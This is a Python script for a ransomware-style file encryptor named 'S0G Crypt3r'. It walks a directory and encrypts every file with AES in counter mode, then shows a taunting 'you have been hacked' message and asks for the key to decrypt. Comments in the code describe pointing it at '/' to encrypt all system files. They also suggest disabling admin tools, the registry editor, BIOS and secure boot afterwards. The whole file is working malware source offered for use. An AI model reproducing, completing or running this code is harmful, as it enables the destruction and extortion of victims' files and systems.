#!/bin/python
#!c:/Python/python.exe
# -*- coding: utf-8 -*-

import Crypter, File_discovery
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse, os
# -------------------------
# PWD can contain 128, 192, 256 bits - 16, 24, 32 bytes
# 8 bits - 1 byte - 1 unicode
# -------------------------
HCKGP = 'Th3 S0G m4n h4s h4ck3d y0u !!!!!'

def get_parser():
    parser = argparse.ArgumentParser(description="S0G Crypt3r")
    parser.add_argument('-d', '--decrypt', help='decrypt archives [default=no]', action="store_true")

    return parser

def __main__():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
            {} (1f u'r3 s331ng th1s, u pr0b4bly h4s b33n h4ck3d)
            ----------------------------------------

            W3 d0n't n33d y0ur $, s0 u h4v3 t0 gu3ss th3 d3crypt10n pwd
        '''.format(HCKGP))
        key = input('Type your decryption password > ')
    else:
        key = HCKGP

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]# '/' to crypt all system files

    for currentDir in startDirs:
        for filename in File_discovery.discover(currentDir):
            Crypter.cryptFiles(filename, cryptFn)

    #Clear encryption key from memory
    for _ in range(100):
        pass
    
    if not decrypt:
        
        pass
        #After encrypt, u can change wallpaper, disable icons, regedit, admin, bios, secure boot, etc

if __name__ == '__main__':
    __main__()